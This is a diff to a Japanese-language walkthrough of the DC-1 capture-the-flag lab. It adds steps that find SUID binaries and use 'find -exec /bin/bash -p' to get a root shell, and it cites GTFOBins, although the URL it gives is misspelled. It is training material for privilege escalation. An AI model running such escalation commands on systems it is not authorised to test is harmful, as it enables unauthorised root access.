@@ -121,3 +121,15 @@ www-data@DC-1:/var/tmp$ cd /tmp
 ```
 www-data@DC-1:/$ find / -perm -u=s -type f 2> /dev/null
 ```
+18.Findコマンドを利用してシェルを奪う
+- GTFOBins ⇒　`https://gtfobins.githb.io` :シェルを奪うコマンド例を調べられる
+```
+www-data@DC-1:/$ which find									
+www-data@DC-1:/$ /usr/bin/find . -exec /bin/bash -p \; -quit
+```
+```
+# bash-4.2# 	←管理者権限のプロンプトが返ってくる
+```
+19.フラグファイルを開く
+
+![kekka](images/kekka.png)
